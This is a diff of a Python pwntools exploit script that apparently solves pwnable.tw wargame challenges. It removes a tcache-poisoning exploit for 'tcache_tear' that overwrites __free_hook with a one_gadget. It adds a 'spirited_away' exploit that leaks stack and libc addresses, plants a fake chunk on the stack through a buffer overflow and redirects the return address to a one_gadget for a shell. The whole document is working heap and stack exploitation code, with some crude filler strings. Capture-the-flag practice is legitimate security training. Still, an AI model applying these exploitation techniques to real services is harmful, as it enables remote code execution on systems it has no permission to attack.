@@ -1,79 +1,78 @@
 '''
 libc.so.27
-要伪造一个要被free到tcachebin的chunk，只需要在其后伪造一个header为p32(0)+p32(0xx1)的chunk
+伪造一个chunk到栈上
 '''
 from pwn import *
+from time import *
 context.log_level='debug'
-#p=process(['tcache_tear'],env={"LD_PRELOAD":"/home/heihei/libc.so.6"})
-#p=process('./tcache_tear')
-p=remote('chall.pwnable.tw',10207)
-#raw_input()
-p.recvuntil('Name:')
-name='a'*(0x602088-0x602060+2)
-p.send(name)
-def malloc(size,data):
-    p.recvuntil('choice :')
-    p.sendline('1')
-    p.recvuntil('Size:')
-    p.sendline(str(size))
-    p.recvuntil('Data:')
-    p.send(data)
-def free():
-    p.recvuntil('choice :')
-    p.sendline('2')
-def show():
-    p.recvuntil('choice :')
-    p.sendline('3')
-    p.recvuntil('Name :')
-    #print(p.recvuntil('\x00')[:-1])
-    return u64(p.recvuntil('\x00')[:-1].ljust(8,'\x00'))
+#p=remote('chall.pwnable.tw',10204)
+p=process('./spirited_away')
+raw_input()
+def oneround(name,age,reason,comment,flag='y\x00'):
+    p.recvuntil('name: ')
+    sleep(0.01)
+    p.send(name)
+    p.recvuntil('age: ')
+    sleep(0.01)
+    p.send(age)
+    p.recvuntil('movie? ')
+    p.send(reason)
+    p.recvuntil('comment: ')
+    p.send(comment)
+    p.recvuntil('<y/n>: ')
+    p.send(flag)
 
-#a fake chunk in 0x602478(dataptr) suitablesize
-malloc(144,'aaa')
-free() #0
-free() #1
-size=p64(0x21)
-pre_size=p64(0)
-payload=pre_size+size+'a'*0x10+p64(0x20)+p64(0x21)
-malloc(144,p64(0x602470)) #tcachebins put the ptr2data
-malloc(144,'hehe')
-malloc(144,payload)
+#read ebp
+reason='d'*79
+p.recvuntil('name: ')
+p.sendline('a')
+p.recvuntil('age: ')
+p.sendline('10')
+p.recvuntil('movie? ')
+p.sendline(reason)
+p.recvuntil('comment: ')
+p.sendline('b')
+p.recvuntil('Reason:')
+p.recvuntil('\n')
+ebp_addr=u32(p.recvn(4))-0x20
+libc_base=u32(p.recvuntil('\n')[-5:-1])-0x1d8d80
+print('ebp_addr=>0x%x'%ebp_addr)
+print('lic_base=>0x%x'%libc_base)
+p.recvuntil('<y/n>: ')
+p.sendline('y')
+#oneround('a','10','a','b')
+for i in range(100):
+    sleep(0.01)
+    oneround('a\x00','10\x00','a\x00','b\x00')
 
-#
-malloc(80,'aaa') #5
-
-free() #2
-free() #3
-
-#yidaonane and fill the gap betw 0x602088 0x602060
-offset=(0x602088-0x602060+2)-0x20
-#a fake chunk 
-#payload=p64(0x420)+'b'*40+p64(0x602060)
-pre_size2=0x80
-payload=p64(pre_size2)+p64(0x421)+p64(0x602038)+p64(0)+'b'*24+p64(0x602060)
-malloc(80,p64(0x602050)) #tcachebins put the ptr2data
-malloc(80,'hehe')
-malloc(80,payload)
-
-free() #4
-leak_addr=show()
-libc_base=leak_addr-0x3ebca0
-print(hex(leak_addr))
-print("libc_base:%x"%libc_base)
-#'''
-libc=ELF('/home/heihei/libc.so.6')
-free_hook=libc_base+libc.symbols['__free_hook']
-print("free_hook%x"%free_hook)
-#change malloc_hook address
-malloc(156,'aaa')
-free() #5
-free() #6
-one_gadget=0x4f322+libc_base
-payload=p64(one_gadget)
-malloc(156,p64(free_hook)) 
-malloc(156,'hehe')
-malloc(156,payload)
-free()
-
+#next round can read 110bytes to comment
+#overflow name, a fake chunk in the stack
+#comment to name,84bytes
+p.recvuntil('name: ')
+p.send('name\x00')
+p.recvuntil('movie? ')
+reason=p32(0)+p32(0x41)
+reason+='a'*56
+reason+=p32(0)+p32(0x11)
+p.send(reason)
+p.recvuntil('comment: ')
+comment='b'*84
+#name
+fake_chunk_ptr=ebp_addr-0x54+4+8
+comment+=p32(fake_chunk_ptr)
+p.send(comment)
+p.recvuntil('<y/n>: ')
+p.sendline('y')
+# recveive a fake chunk offset2ebp -72
+p.recvuntil('name:')
+elf=ELF('/lib/i386-linux-gnu/libc.so.6')
+one_gadget=0x3d0d3+libc_base
+payload='a'*72+p32(0xffffffff)+p32(one_gadget)
+p.send(payload)
+p.recvuntil('movie? ')
+p.send('fuckyou')
+p.recvuntil('comment: ')
+p.send('heihei')
+p.recvuntil('<y/n>: ')
+p.sendline('n')
 p.interactive()
-
